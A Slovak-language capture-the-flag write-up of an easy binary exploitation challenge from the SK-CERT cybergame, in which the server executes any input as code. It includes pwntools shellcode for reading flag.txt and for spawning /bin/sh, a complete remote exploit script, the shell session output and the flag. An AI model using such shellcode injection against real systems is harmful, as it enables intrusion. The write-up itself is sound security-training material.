# Zadanie

EN: Your latest assignment from the shadows takes you deep into ByteBusters' isolation division. Their security architects boast about their "perfect isolation", where sensitive information exists only in one process while execution happens in an another.

SK: Tvoja najnovšia úloha z tieňov ťa zavedie hlboko do ByteBusters divízie izolácií. Ich bezpečnostní architekti sa chvália svojou "dokonalou izoláciou", kde citlivé informácie existujú len v jednom procese, zatiaľ čo vykonávanie kódu prebieha v inom.

`exp.cybergame.sk:7004`

**Súbory:**

- chall

## Riešenie

Táto úloha bola spomedzi binexp úloh najjednoduchšia. Dokonca tak, že som ju vyriešil bez binárky pred publikáciu. V princípe, keď sa pripojím na server, tak ten zahlási `Feel free to enter any compiled code:`, čo hneď evokuje, že mám vložiť shellcode a ten sa vykoná. Dokonca aj binárka, konkrétne jej funcia user_function 

```c
void user_function(void)

{
  code *executable_memory;
  
  executable_memory = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  if (executable_memory == (code *)0xffffffffffffffff) {
    puts("mmap failed");
  }
  else {
    printf("Feel free to enter any compiled code: ");
    fgets((char *)executable_memory,0x1000,stdin);
    (*executable_memory)();
  }
  return;
}
```

hovorí, že v podstate namapuje náš shellcode a ten následne spustí priíkazom `(*executable_memory)()` `() znamená zavolaj, * je pointer na adresu v pamäti, kam sa uložil náš shellcode`. Takže žiaden buffer overflow, jednoduchý proces, aký shellcode dáme taký shellcode sa vykoná.

Na toto je veľmi dobrý asm shellcraft priamo zabudovaný python libke pwntools, takže ak sa vlajka nachádza v adresári s úlohou tak mi stačí `cat flag.txt` a príkaz na vygenerovanie shellcode bude

```python
from pwn import *

context.clear(arch='amd64')
shellcode = asm(shellcraft.cat("flag.txt"))
```

pre spustenie shellu by to bolo napríklad

```python
context.clear(arch='amd64')
shellcode = asm(shellcraft.execve("/bin/sh"))
```

Kedže pre spustením challengu som nevedel, kde je vlajka, použil som možno spawnutia shellu.

Môj python skript, ktorý toto dokázal, je veľmi lightweight, ale svoju prácu si vykoná

```python
from pwn import *

context.clear(arch='amd64')
shellcode = asm(shellcraft.execve("/bin/sh"))

conn = remote("exp.cybergame.sk", 7004)
conn.recvuntil(b"Feel free to enter any compiled code: ")
conn.sendline(shellcode)

conn.interactive()

```

V podstate sa len vygeneruje shellcode, pripojí sa na server, počká si na prijatie dát zo servera a na moment, kedy server očakáva vstup, pošlem mu shellcode a prepnem sa do interaktívneho režimu.

Výstup je

```
[+] Opening connection to exp.cybergame.sk on port 7004: Done
[*] Switching to interactive mode
$ ls -la
total 32
drwxr-xr-x 1 root root  4096 May 19 21:12 .
drwxr-xr-x 1 root root  4096 Jun  1 19:33 ..
-rwxrwxr-x 1 root root 16800 Apr  7 08:17 chall
-rw-rw-r-- 1 root root    35 May 19 08:14 flag.txt
$ cat flag.txt
SK-CERT{1_w4n7_70_run_my_0wn_c0d3}
$  
```

## Vlajka

```
SK-CERT{1_w4n7_70_run_my_0wn_c0d3}
```
